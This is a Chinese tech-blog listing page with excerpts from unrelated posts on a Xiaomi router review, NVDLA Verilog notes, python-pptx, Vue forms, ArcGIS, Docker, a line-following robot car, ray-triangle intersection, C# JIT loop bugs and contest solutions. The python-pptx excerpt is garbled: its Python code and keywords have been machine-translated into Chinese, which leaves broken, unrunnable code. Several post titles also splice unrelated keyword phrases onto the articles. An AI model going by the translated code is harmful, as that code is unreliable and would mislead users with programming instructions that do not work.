			<a href="/posts/77e5dccadc9faf430b53c67cd4fb325e/" rel="bookmark">
			m6000路由器产品介绍与基本操作_旗舰之名名副其实！小米旗舰路由器AC2100开箱评测...
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		小米拥有全球最强的IoT平台，目前包括小米手机、小米电视和小米音箱在内的多款产品，都是小米IoT智能家居的控制终端。然而，控制终端再重要也需要联网，所以路由器的重要性也很高。
小米路由器是小米智能家居中销量最猛的产品之一，但由于稳定性等原因，其口碑不怎么太好。为了解决这个问题，小米路由器今年开始发力了，其推出的新一代小米路由器Mesh不仅信号覆盖强，而且稳定性大大提高了。现在，小米又推出了一款旗舰路由器AC2100，那么这款路由器如何呢？
↑ 小米路由器AC2100的外包装延续了小米简洁的风格，正面标注了路由器型号和产品图，还有一些主打的亮点。
↑ 背面介绍了路由器的一些功能，以及有线网络和无线网络的参数，还有生产等信息。
↑ 侧面标明了产品的最大支持，包括支持1000M宽带、200平方网络覆盖和最多连接128台设备。
↑ 另一侧面详细介绍了配置等参数，小米路由器AC2100支持MU-MIMO，其中2.4G频段是2x2，5G频段是4x4。小米路由器AC2100搭载联发科MT7621A MIPS双核880MHz处理器，内存128M，ROM128M，最高支持2033Mbps的无线WiFi速率，支持Beamforming技术。
↑ 小米路由器AC2100内部同样也很简洁，只有路由器产品本身和一个附件盒。
↑ 附件盒内部是电源适配器和网线，使用说明书位于路由器下面，里面只有这三个附件。
↑ 电源适配器输入100-240V宽频，输出12V 1A。
↑ 附送的网线是很常见的黄色，如果送的是黑色就完美了，这样就跟路由器很搭了。网线的质量不错，六类千兆网线。
↑ 小米路由器AC2100延续了Mesh的ID设计，内置四根全向高增益隐藏天线，机身为圆柱形。出厂保护膜上标注了三步快速设置网络的方法，很贴心。
↑ 小米路由器AC2100虽然是圆形设计，但前后左右各有一个凹槽，提高了颜值不至于让圆形的外观太低调。
↑ 背面同样有凹槽。
↑ 顶部是小米的logo，上面拥有大面积的散热孔。
↑ 底部采用了防滑胶垫设计，同样有大量的散热孔。小米路由器AC2100采用了立体式散热系统，配备内部的大散热片，可以有效降低路由器的温度，保证稳定性，下面有温度测试。
↑ 位于正面底下隐藏的两个指示灯，一个是网络连接指示灯，另一个是路由器运行状态灯。
↑ 背面接口，分别是三个LAN孔，一个WAN孔，电源接口和复位键。复位键好评，手指就可以直接按。
↑ 外观欣赏。
↑ 与小米路由器Mesh外观对比，一个是椭圆形，一个圆形。小米路由器AC2100要稍微大一些。
↑ 连接好电源和网线，状态灯变蓝就可以配置路由器了。
↑ 三步设置，首先连接出厂的WiFi信号，连接后会自动跳出配置页面，然后会自动检测上网方式，输入宽带账号和密码，设置WiFi名称就可以上网了。
↑ 连接设置好的路由器WiFi，然后打开小米WiFi App，页面会自动弹出发现新路由，点击立即绑定，就可以管理路由器了。
↑ 小米WiFi App页面，首页是网络状态和网速，设备里面可以管理连接的设备，工具箱里是路由器的一些功能。相比其他小米路由器，这次小米路由器AC2100加入了网易UU游戏加速功能。
↑ 注册或登陆网易UU游戏加速后，就可以为连接的设备加速了，比App操作要方便很多。需要注意的是，绑定路由器后赠送7天免费高级会员，每次只能为两台设备加速。
↑ 小米WiFi App只是一些常用的设置，而电脑网页版的设置页面功能要更强大一些。
↑ 网络测速，签约宽带为下行200M，上行30M。
↑ WiFi设置页面的WiFi双频合一开关，后续要测试2.4G和5G的WiFi信号，就不打开了。
↑ MU-MIMO和Beamforming开关，可选择打开或关闭。
↑ IPV6网络设置开关。
↑ 体验完了小米路由器AC2100的功能，下面就是信号和网络等稳定性测速了，对比的路由器是华硕AC86U，以及仅支持2.4G的中兴F650光猫。
↑ 房型为农村常见的前后屋，两款路由器放在客厅同一个位置上，分别测试A B C D E F G H I等9个点的信号，信号测试的手机为魅蓝3，因为WiFi分析仪不支持目前的安卓版本。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/77e5dccadc9faf430b53c67cd4fb325e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/60005b349ab5fdea4f5c011cbc4c5056/" rel="bookmark">
			四选一数据选择器verilog_【NVDLA学习笔记：008】基于开源项目学习Verilog
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		少说废话，多看代码。
1. NVDLA是个完整的开源IP项目，提供了RTL源码，软件代码，设计文档，验证环境。这是商业公司维护的开源项目，代码质量不错。
对于研究或者从事AI加速器设计相关工作有实际的意义。包括卷积层的实现架构，片内存储单元的设计，标量与矢量运算单元的实现，带宽与性能的平衡设计考虑。
对于学习Verilog或者前端设计工作，可以借鉴很多基本单元设计的代码。比如AMBA总线接口，FIFO，数据运算，控制逻辑，复位处理，时钟网络，握手信号，memory接口与控制等。
同时提供了代码自动生成的一些脚本实例。比如使用内嵌python的代码自动生成，基于宏定义的代码配置等等。
针对验证方面，提供了一个基本的基于uvm的验证环境，可以作为IP级验证环境的参考。
软件方面，提供了firmware和性能仿真相关源码，网上也可以找到网络编译器相关的资料。
2. 人工智能是最近几年的热点，芯片是最近几年的痛点，人工智能芯片项目还能火几年。
NVDLA是一个硬件加速器IP，支持卷积神经网络(CNN)常用的一些运算操作：比如卷积，激活，池化等。支持FP16，INT16，INT8等数据精度，详细性能(Tops)和功耗(Walt)参数可以参考官方网站。
NVDLA开发环境支持Caffe模型输入，利用编译器进行量化和网络结构分割，然后交付硬件调度执行，对主CPU的占用率不高。
NVDLA可以放在FPGA平台上，结合周边外设，实现各类智能应用，比如目标分类，人脸检测等。
3. 基于开源项目学习Verilog是个不错的思路。
以NVDLA开源项目为基础，逐步熟悉Verilog在大型IP开发中的实战应用，了解AI硬件加速器的设计思路。
方法以代码阅读为主，结合技术文档资料，辅助代码仿真实践。
输出内容包括个人学习笔记，以及实验代码(如有)。
日拱一卒，难在坚持。
推荐阅读，欢迎交流
【NVDLA学习笔记：001】获取源码
【NVDLA学习笔记：002】Tree Config Mak
【NVDLA学习笔记：003】Environment Setup
【NVDLA学习笔记：004】运行一个仿真case
【NVDLA学习笔记：005】代码综合
【NVDLA学习笔记：006】FPGA移植
【NVDLA学习笔记：007】参考资料汇总
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a4f96eb1904f924c7bdea00315850d6e/" rel="bookmark">
			python 占位符_详解Python操作PPT的各种骚操作！
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、python-pptx模块简介
使用python操作ppt，需要使用的模块就是python-pptx，下面来对该模块做一个简单的介绍.
这里提前做一个说明：PythonPPT，最好是我们提前设计好自己的一套样式，然后利用进行python进行内容的获取和填充(最主要的功能！)，最好是不用使用python代码操作ppt的格式，格式的修改肯定不如我们直接在ppt中修改方便.
可以创建、修改ppt(.pptx)文件需要单独安装，不包含在Python标准模块里 2、模块的安装与导入1)模块的安装
“Windows用户命令行下输入”
PIP安装python-pptx
“mac用户命令行下输入”
PIP 3安装python-pptx2)模块的导入
这里有一点需要注意的是:安装的库是python-pptx，但是导入的时候却有点不同.进口pptx3、python读取ppt文档中的内容1)PPT的结构说明
在使用python操作ppt之前，首先应该清楚ppt的结构，这个对于之后代码的编写很有帮助.2)获取滑动从…pptx进口展示
PRS=演示文稿(“统计学习方法PPT.pptx”)为滑梯在……里面幻灯片：
打印(幻灯片)
结果如下：3)获取形状形状进口pptx从…pptx进口展示
PRS=演示文稿(“统计学习方法PPT.pptx”)为滑梯在……里面幻灯片：为形形在……里面滑块形状：
打印(形状)
"""
注意:这里得到的Shape对象，并不能看出什么，接着往下看.
"""
结果如下：4)判断每个形状中是否存在文字
Shape.had_text_framework：是否有文字Shape.text_framework：获取文字框 进口pptx从…pptx进口展示
PRS=演示文稿(“统计学习方法PPT.pptx”)为滑梯在……里面幻灯片：为形形在……里面滑块形状：如果Shape.had_text_framework：
文本帧=shape.text_framework
打印(Text_Fra.text)
结果如下：5)获取某一页幻灯片中的内容进口pptx从…pptx进口展示
PRS=演示文稿(“统计学习方法PPT.pptx”)为我，滑梯在……里面列举(幻灯片)：如果I=5：为形形在……里面滑块形状：如果Shape.had_text_framework：
文本帧=shape.text_framework
打印(Text_Fra.text)
结果如下：6)获取形状中的某个段落进口pptx从…pptx进口展示
PRS=演示文稿(“统计学习方法PPT.pptx”)为我，滑梯在……里面列举(幻灯片)：如果I=5：为形形在……里面滑块形状：如果Shape.had_text_framework：
文本帧=shape.text_framework为段落在……里面案文框架.段落：
印刷(案文)
"""
注意:该方法和上述4)中的方法一摸一样.上述方法是直接获取Shpae中的文字内容；
下面这个更灵活，先获取每个形状，然后在获取每个形状中的段落；
下面方式更好:因为我们可以针对段，写一个判断条件，只获取第几个段；
"""
结果如下：4、利用python像ppt中写入内容1)幻灯片模板及占位符的概念2)怎么自定义母版？3)什么是版式？
这个概念在下面的效果中，会得以体现.其中_表示获取的是第二个版式，以此类推下去[]传入0表示获取的是第一个版式，传入1表示获取的是第二个版式，以此类推下去.4)添加幻灯片和内容
这里就需要使用上述的自定义母版.因为毕竟是使用python操作PPT，我们可以定义好自己想要展示的PPT母版，然后借助代码完成PPT的内容写入操作.1占位符id的确认进口pptx从…pptx进口展示
PRS=演示文稿(“空白.pptx”)
表示的是ppt中不同的版式
幻灯片=幻灯片。添加_幻灯片(prs.幻灯片_布局[0])为形形在……里面幻灯片.占位符：
Pff=shape.占位符格式
打印(f“{phf.idx}--{shape.name}--{phf.type}”)
Shape.text=f“{phf.idx}--{shape.name}--{phf.type}”
#注意:做完这个操作，一定要记得保存一下！
保存(“电子奖状模板.pptx”)
"""
上述打印结果如下：
0--标题1--标题(1)这个表示标题占位符，id为0
图片占位符2-图片(18)这个表示图片占位符，id为13
14-文本占位符3-主体(2)这个表示正文内容占位符，id为14
15--文本占位符4--主体(2)这个表示正文内容占位符，id为15
我们一定要先知道每个空格的占位符id，才可以进行下面内容的填充.
"""
效果如下：2 PPT内容的填写进口pptx从…pptx进口展示
PRS=演示文稿(“空白.pptx”)
幻灯片=幻灯片。添加_幻灯片(prs.幻灯片_布局[0])
名称=幻灯片.占位符[14]
为什么=幻灯片.占位符[15]
Name.text=“黄同学”
Why.text=“学习太积极”
保存(“内容填充.pptx”)
效果如下：5)添加段落1占位符id的确认进口pptx从…pptx进口展示
PRS=演示(“Finall.pptx”)
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a4f96eb1904f924c7bdea00315850d6e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1b5c47266823bd4b69b1e674b0107943/" rel="bookmark">
			vue rules 表单验证_Vue 面向对象编程 —— 领域驱动 表单
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前文说到用抽象类做自顶向下的开发，稍稍有些复杂，现在的新思潮其实已经不推荐采用抽象类，继承等概念了
为什么呢？
因为组合优于继承
因为继承一定程度打破了类的封装性，而且还由于一系列的复杂的用法——抽象方法，多继承，钻石继承等——导致维护成本上升
但这并不意味着继承是无用的，继承最主要作用在架构上
继承可以作为架构师发力的工具，比如 enterprise-architecture 自动生成抽象类等用法 总结一句话：
继承是用来限制人用的
而现在，第三方库很丰富，普通人不考虑架构也可以做出功能多样的应用，再加上云服务等新型开发模式出现
按照功能领域划分代码结构比按照观念划分结构更适合
比如之前的表单，我们不需要考虑一个表单真的有那些功能，只需要实现最核心的功能即可，利用类的极强扩展性，将其它功能附加进来即可
这实际上是自顶向下和自底向上的思维方式区别，二者没有优劣之分，一般来说，分析问题时自顶向下，解决问题时自底向上，同时也分别是面向对象和函数式发力的地方 一个表单，最重要的就是 表单项 到 数据模型 的绑定和同步
还是用表单做例子哈，因为一个 UI 框架，最重要的就只有三个： 表单，表格，浮动层 我们希望实现的目标是（再重温一遍哈）：
整个表单只有一个输入 initialValue，和一个输出 handleChange，包含数据模型结构，表单项绑定，都自动完成，并且要考虑表单嵌套的情况
之所以这么封装，目的是保证
所见即所得 使得使用者的负担降到最低
这次按照领域来开发，FormService 和 FormItemService 只包含最小功能集合：
每个表单有个独立的注入口令，也有一个公共的注入口令
Form 组件在注入相关服务时，需要注入两遍实体：
为什么要注入两遍呢？
静态属性的注入口令是特定的，只要是 Form 都是如此，保证每个 FormItem 拿到的都是离他最近的父组件 Form
但是如果我想要指定某个 FormItem 是特定 Form 的项目怎么办？
很简单，传入相关令牌即可：
const 第一个 FormItem 属于表单 form1，第二个 FormItem 属于表单 form2，相关结构绑定也是如此
因此，FormItemService 实现如下：
注意 data 绑定 的 toRef 方法
按照官方的说法：
相当于它是 form.model 的一个代理对象，通过设置其 value 就可以做到更改 form.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1b5c47266823bd4b69b1e674b0107943/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b9b38b63d89e18bb0108dbd96a1a757d/" rel="bookmark">
			arcgis字段计算器赋值_ARCGIS操作技巧总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		点击蓝字 关注我们
ARCGIS操作技巧总结(一)
一、新建数据图层字段
首先我们打开Arcmap加载要新建属性字段的图层，打开属性表，点击添加字段，具体操作如下：
视频演示如下：
二、给属性字段批量赋值：
我们在处理arcgis数据时，会出现给每个要素赋值的情况，单个赋值属性不但浪费工作时间而且会相当的费事，下边小编用两种方法和大家分享一下：
第一种方法：
(1)首先打开要批量赋值的数据层属性表，点击要赋值的属性字段；
(2)点击字段计算器，将要赋值的信息输入到字段计算器界面中，以"道路"为例，(一定是在英文状态下输入引号)，点击确定批量赋值就完成了。
(2)选择所有要编辑的图斑，在Arcmap软件界面的右边可以看到所有选择图斑的属性框，点击要编辑的字段，输入字段值确定完成批量赋值的操作。(备注：全选时可以用快捷键ctrl+A)
视频演示如下：
扫码关注我们
微信号｜ GIStinle
网址：www.chentinle.com
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4a0f2fc1df515ad9a9da61b020b241f3/" rel="bookmark">
			docker镜像启动后端口号是多少_RSS、智能家居、个人博客、维基百科……Docker 入门指南...
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		如果你购买过 VPS 云主机，那么或多或少，你都可能听说过 Docker。如果你从未听说过 Docker，那么本文可能能够为你开启新世界。
利用 Docker，你能够非常轻松地部署各类服务，无论是个人云盘(Nextcloud：打造属于自己的网盘服务 Docker 版 (附带视频)、个人的 RSS 服务(利用 Docker 搭建 Tiny Tiny RSS 服务)、HomeKit 桥接(利用 Docker 搭建 HomeKit 智能家居)，亦或者搭建一个个人博客(使用 Docker 部署 Ghost 教程)，甚至是做一个自己的维基百科、自己的社交软件，都能够轻松地实现。
是的，Docker 就好像是 服务器端的「应用商店」，你能够通过 Docker，轻松的部署各种属于个人、团队的服务。而现如今，无论是利用各个平台的云主机，还是树莓派、群晖、威联通等这类物理的服务器主机，甚至是自己废旧的老电脑，都能够很容易的使用上 Docker。
在正式开启前，本文默认读者了解基本的命令行操作，以及了解基本的 Linux 相关知识，如果您还不了解这些，可以通过 B 站 这个 UP 主的 视频 有所了解。
那么开启 Docker 之旅吧！
Docker 可以理解为寄存在主机上的特殊的虚拟机。它利用特殊的虚拟化技术，比一般的虚拟化技术能够更加高效合理的利用资源。一台主机上可以创建众多的容器，这些容器通过特定的方式与主机共享硬件资源，并且访问特定的文件，使用特定的端口。通过 Docker ，一台主机能够运行多种不同的服务。
第一步：安装或者启用 Docker
一般来说，Docker 会运行在 Linux 服务器上，无论是哪种发行版本，你都可以非常容易的在搜索引擎中找到其安装方法。这里我以 Ubuntu 为例：
$ sudo apt update # 先更行一下软件包缓存$ sudo apt install docker-ce # ce 代表社区版 接着启动 Docker 服务：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4a0f2fc1df515ad9a9da61b020b241f3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e667788061d042ca661039331884b5e6/" rel="bookmark">
			2个红外传感器循迹原理_智能循迹小车
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		今天我们来学习制作智能循迹小车
那么什么是智能小车呢？
智能小车作为现代的新发明，是以后的发展方向，它可以按照预先设定的模式在一个环境里自动的运作，不需要人为的管理，可应用于科学勘探等等的用途。智能小车能够实时显示时间、速度、里程，具有自动寻迹、寻光、避障功能，可程控行驶速度、准确定位停车，远程传输图像等功能。
我们本次智能小车制作
主要是让小车实现根据黑线的路径进行循迹的功能
(避障功能可自由完成)
智能小车可以分成三个部分——传感器部分、控制器部分、执行器部分
• 控制器部分：接收传感器部分传递过来的信号，并根据事前写入的决策系统(软件程序)，来决定机器人对外部信号的反应，将控制信号发给执行器部分。好比人的大脑。
• 执行器部分：驱动机器人做出各种行为，包括发出各种信号(点亮发光二极管、发出声音)的部分，并且可以根据控制器部分的信号调整自己的状态。对机器人小车来说，最基本的就是轮子。这部分就好比人的四肢一样。
• 传感器部分：机器人用来读取各种外部信号的传感器，以及控制机器人行动的各种开关。好比人的眼睛、耳朵等感觉器官。
一智能循迹小车简介 ❂ 小车工作原理 本系统采用较为简单的设计方案，通过红外传感器循迹模块判断黑线的路径，然后由80C51单片机通过IO口控制L298N电机驱动模块改变两个直流电机的工作状态，最后实现循迹功能。
❂ 系统构成——系统框图 ❂系统构成——工作流程 第一阶段：接通电源，系统初始化，红外传感器收集路径信息，传输给单片机主控模块。
第二阶段：单片机主控模块对采集的信号进行处理和逻辑判断发出控制信号，传输给电机模块 第三阶段：电机驱动模块执行单片机主控模块发来的指令，驱动电机运转。
第四阶段：智能小车自动循迹，根据黑线前进、左转、右转、后退 。 二组件说明 1、单片机主控电路
本次小车制作用89C51单片机作为其主要控制器部分，接受由传感器传输来的信息，进行判断后将控制信号发送给执行部分。
控制器部分的制作即是制作一个51单片机最小系统。通过传感器部分和执行部分的连接，编写程序来判断接收到的信息然后做出响应。
2、红外传感器模块
采用的是TCRT5000红外循迹探头传感器，检测发射距离：1mm~25mm适用。所以安装红外传感模块要尽量在此检测距离内。其上有三个引脚，分别是VCC、GND、OUT。VCC：连接电源正极；GND：连接电源负极；OUT：输出信号端口，与单片机IO口相连。
工作原理：传感器的红外发射二极管不断发射红外线，当发射出的红外线没有被反射回来或被反射回来但强度不够大时，光敏三极管一直处于关断状态，此时模块的输出端为低电平(即输出0)，指示二极管一直处于熄灭状态；被检测物体出现在检测范围内时，红外线被反射回来且强度足够大，光敏三极管饱和，此时模块的输出端为高电平(即输出1)，指示二极管被点亮
注意：由于各个厂家生产的红外传感器模块原理图不尽相同，高低电平逻辑也不相同。例如模块发射的光线被反射回并被模块识别到，即输出高电平信号，但是，不同厂家生产的可能输出低电平信号。因此红外传感器的工作模式需要自己甄别。
3、超声波测距模块
采用HC-SR04，有四个引脚分别是VCC、GND、TRIG(控制开始测距)、ECHO(响应输出)
工作原理：
(1)通过TRIG触发测距，给至少10us的高电平信号;
(2)模块自动发送8个40khz的方波，自动检测是否有信号返回；
(3)有信号返回，通过ECHO输出一个高电平，高电平持续的时间就是超声波从发射到返回的时间。测试距离=(高电平时间*声速(340M/S))/2;
本模块使用方法：一个控制口(TRIG)发一个10US以上的高电平，就可以在接收口(ECHO)等待高电平输出。一有输出就可以开定时器计时，当此口变为低电平时就可以读定时器的值，此时就为此次测距的时间，方可算出距离。如此不断的周期测，即可以达到你移动测量的值。
4、L298N电机驱动模块
采用光电耦合器件隔离单片机与L298N的控制电路，工艺精度高，性能可靠。L298N模块内部通过H桥电路实现直流电机的正转，反转，还可以通过单片机输出PWM控制使能端进而控制直流电机的转速，实现前进、后退、转弯。
主要参数：
电流-输出\通道：2A
电流-峰值输出：3A
电源电压：4.5~46V(一般采用12V供电)
工作温度：-25℃~130℃
工作原理及实物图：
通过改变逻辑输入端，输入高\低电平使直流电机工作状态发生改变。
5、直流电机
电机有正负极，把电机的+和-分别接到电源的正极和负极，电机即可转动，如果要改变电机的转动方向，改变正负极即可。电机的转速我们可以理解为和外接的电压是正相关的。电源电压一般是已经确定了，因此如果我们要对电机进行调速，就需要用PWM波对电机进行调速。
6、电源模块
电源建议采用两个18650电池给L298N电机模块供电，再通过L298N上的5V输出端口给单片机和传感器供电。
三PWM简介 什么是PWM：
PWM是脉冲宽度调制的简称，脉冲宽度调制是利用微处理器的数字输出来对模拟电路进行控制的一种非常有效的技术，广泛应用在从测量、通信到功率控制与变换的许多领域中。
PWM产生过程：
利用51单片机的T0定时计数器，工作在预装载模式下。设置定时器定时中断时间(本次设计采用0.1ms)中断一次从而产生占空比可调的方波信号，即PWM信号。
(占空比是指在一个脉冲循环内，通电时间相对于总时间所占的比例。)
PWM调速原理：
通过输出PWM调节驱动电压脉冲宽度的方式，并与电路中一些相应的储能元件配合，改变了输送到电枢电压的幅值，从而达到改变直流电机转速的目的
PWM产生流程图
那么如何编写程序使51单片机产生PWM信号呢？
你们可以参考以下例程
PWM调速例程 void time0(void)interrupt 1 //中断程序
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e667788061d042ca661039331884b5e6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3471f6e12f0b924cbf6952ab9a3aafdf/" rel="bookmark">
			Möller-Trumbore算法-射线三角形相交算法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Möller-Trumbore算法 一、概述二、准备知识三、Möller-Trumbore 算法推导推导过程 四、代码实现 一、概述 Möller-Trumbore 射线三角相交算法是一种快速计算射线与三角形在三个维度上的交点的方法，通过向量与矩阵计算可以快速得出交点与重心坐标，而无需对包含三角形的平面方程进行预计算。另外，它还应用于计算机图形学中以实现涉及三角形网格的光线跟踪计算。算法名字是以发明者 TomasMöller 和 Ben Trumbore 的名字来命名的。
二、准备知识 1、三阶方阵的行列式等于三个列向量的混合积
2、克莱姆法则（部分译克拉默法则）
如果一个线性方程组 A x = c \boldsymbol{Ax} = \boldsymbol{c} Ax=c, 其中 A \boldsymbol{A} A 是可逆方阵， x \boldsymbol{x} x， c \boldsymbol{c} c 都是列向量，那么方程有解，且 x \boldsymbol{x} x 的每一个解
其中 A i ​ A_i​ Ai​​ 是被列向量取代了第 i i i 列的矩阵。
三、Möller-Trumbore 算法推导 已知光线 R a y = O + t D \boldsymbol{Ray} = \boldsymbol{O} + t\boldsymbol{D} Ray=O+tD（ O \boldsymbol{O} O 为起点， D \boldsymbol{D} D为射线方向， t t t 为时间）, 三角形三个顶点 P 0 P_0 P0​， P 1 P_1 P1​， P 2 P_2 P2​​。 光线与三角形相交时，可得如下等式：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3471f6e12f0b924cbf6952ab9a3aafdf/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/48d5dd4cd64e0944c0858ec952c07968/" rel="bookmark">
			网站加入代码让网页以电脑端打开_网页上的文本不让你复制下载？老司机教你几招，轻松免费复制...
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		无论是在工作中还是在学习中，大家都会遇到网页上的文本无法复制粘贴的情况，然后只能硬着头皮将里面的内容一个个的用键盘敲出来，其实这些被限制的网页时可以复制的，今天就教你几招，让你轻松免费复制。
一、手机端
如果是用手机浏览网页的话，复制起来也比较方便。
1、百度文库复制
如果你需要复制的文本正好在百度文库中，这样就非常好办了，打开这个网页之后，你可以看看右上角有没有【原版】两个字，有的话就点进去，里面的文字都是可以复制粘贴的，对着文字长按2秒，就可以选择文字进行复制了。
2、图片识别文字
如果你浏览的网页右上角没有【原版】两个字，也不可以进行复制粘贴，就用【迅捷PDF转换器】中的【图片识别文字】功能，直接将网页上的文字截图，在手机上打开这个APP，找到图片识别文字功能，点击它并且上传截图，文字就会被提取出来，都是排版好的，用起来也方便。
二、电脑端
办公的时候只用电脑来浏览网页，那么用电脑怎么复制网页里面的文字呢？
1、打印网页
这个方法很简单，也是非常快速的一种方法，选中需要复制的文字，尽量选多一点，然后右键选择【打印】，这时候打印框内就会出现文字的内容，用鼠标选中文字按下【Ctrl+C】进行复制并粘贴就可以了。
2、查看网页源代码
这个方法也是比较方便的，在空白的地方右键点击【查看网页源代码】，进入代码之后，往下滑找到你需要的内容，选中进行复制就可以了。
以上就是小编整理出来的网页复制方法，这些方法亲测过确实是有效的，也希望能够帮到大家，如果你们还知道哪些好用的复制方法，不妨分享出来，大家一起学习学习。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/238abce4122b0cf2ea0fca7180ca442a/" rel="bookmark">
			C# Task 循环任务_盘点.NET JIT在Release下由循环体优化所产生的不确定性Bug
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		(给DotNet加星标，提升.Net技能)
转自：小曾看世界 cnblogs.com/1996V/p/13909855.html 盘点在Release下由循环体优化所产生的不确定性Bug
在这篇文章中，我将介绍一些在测试环境(DEBUG)下正常，但在生产环境(Release)下却会出现的一些让人难以捉摸的Bug。
如果你对开源技术感兴趣，欢迎和我一起共同贡献开源项目，请联系QQ群：976304396
Debug和Release的区别
首先，Debug和Release是一种编译常量，其决定了编译器是否对能够对代码开启优化功能。
在Release下，代码将被编译器进行优化，这份优化除了我们能够在编译后所了解的IL代码的区别外，还包括JIT(运行时)在正式转化为机器码前所布置的优化内容，而最终都将以汇编的方式呈现出来.
IL代码是一种规范，无论在哪种环境下生成代码，都不会改变逻辑的差异，但最终生成的汇编码却会因为JIT的内部表现而有所不同。
因此，当出现了代码最终执行效果和我们在脑海中所构建的逻辑效果所不同时，我们不应该以IL的角度来去思考，而是以汇编的角度来去查看到底是在哪块有了分歧。
目录
1、循环变量优化
性能差异
2、潜在的Bug
循环变量不变
stackalloc不清零
IL代码无论在哪种环境都会始终表现C#代码的原意，因此，下文的示例将不在描述IL的部分，只描述在debug和release下汇编码的真正区别。
循环变量优化
让我们先从一份简单的for循环代码开始看起：
int len = 这是一个简单的for循环逻辑，在方法内都始终存在两个局部变量i和len，c#代码逻辑所表述的是，我们通过访问i的地址处的值和len的地址处的值进行比较，然后根据比较中的结果来去进行跳转循环。而汇编码所表述的逻辑也基本相同，但对局部变量i和len的解释有所不同。
在Debug下，JIT将始终读取i和len位置处的值去进行比较
-8], 而在Release下，JIT将i的变量始终存储在寄存器中，对于len,则以常量代替.
L0003: mov eax, 1 Release较Debug的变化是：JIT知道在当前方法上下文中，len是个局部变量，且始终不会改变，因此可以提升为常量，这样当进行比较时，可以不用每次都进行访问。i也是个局部变量，且每次增加固定的常量1，因此i也不需要在栈中存储，可以直接保留在寄存器中，这样不会有取址的开销。
上述例子说明了，在一定的条件下，编译器会对循环体中进行比较的变量进行特殊的优化，通过避免在地址中取值，以提升循环的效率。
注:由于CPU对指令执行的速度远高于访问内存的速度,因此相比较对内存进行访问是一种开销,在访问性能中,寄存器&gt;cpu缓存行&gt;主存.
性能差异
让我们通过下面一个例子来看一下，使用寄存器和不使用寄存器来保存循环变量所带来的性能差异:
public void Test1(){ 请通过Benchmark来对Test1和Test2进行测试，你会发现，两个方法之间的性能差别非常大，Test2的性能要远超Test1。
.12 近乎相同的代码,为什么会有如此的差异?
如果我们对其生成的汇编代码进行查看的话，你会发现在Test1中，对变量i的访问，将始终通过寻址来去查找:
L000b: 而在Test2中,则始终通过在寄存器中存储的值直接获取:
L000c: inc edx 在Test2方法中，因为变量i没有被造成污染，因此最终代码等价于 count += i ， 而在Test1方法中， 因为ref关键字的影响,导致了该代码破坏了jit对循环变量的优化规则，最终无法使用寄存器来直接存储变量i，产生了性能的差异。
因此，在往后对循环体的编程中，若代码主体不会改变循环变量的值的话，那么尽量可以在循环体中创建一个副本来去使用，这样对性能可以有效的提升。
注：ref Unsafe.As(ref i) 等价于 (_Int32*)&amp;i
Unsafe.As(ref i) 等价于 *(_Int32*)&amp;i
潜在的Bug
介绍完通过将循环变量直接存储在寄存器中的方式所带来的性能提升后，下面我将介绍因为这种jit优化的方式所带来的潜在性Bug。
for和while是在语法上有所不同，但最终执行表现是相同的，因此，为了后面的例子中所展示的逻辑更直白，对于循环的语法，我将使用do while来描述。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/238abce4122b0cf2ea0fca7180ca442a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/facdffe7c649e16cd1eb6a32264999fb/" rel="bookmark">
			第三届“传智杯”全国大学生IT技能大赛（练习赛题解）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		比赛连接
各数字之和 思路 对数字进行拆分即可。
AC代码 #include&lt;cstdio&gt; using namespace std; bool check(int n) { int res = 0; while(n) { res += n % 10; n /= 10; } return res == 9 ? 1 : 0; } void solve(){ int n, ans = 0; scanf("%d", &amp;n); for (int i = 1; i &lt;= n; ++i) { if (check(i)) { ans++; //printf("%d ", i); } } printf("%d\n", ans); } int main(){ solve(); return 0; } 直角三角形 思路 我们知道勾股定理是a² + b² = c²，那么b = sqrt(c² - a²); 然后枚举a，算出b，再用勾股定理算两次的值是否相等即可。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/facdffe7c649e16cd1eb6a32264999fb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
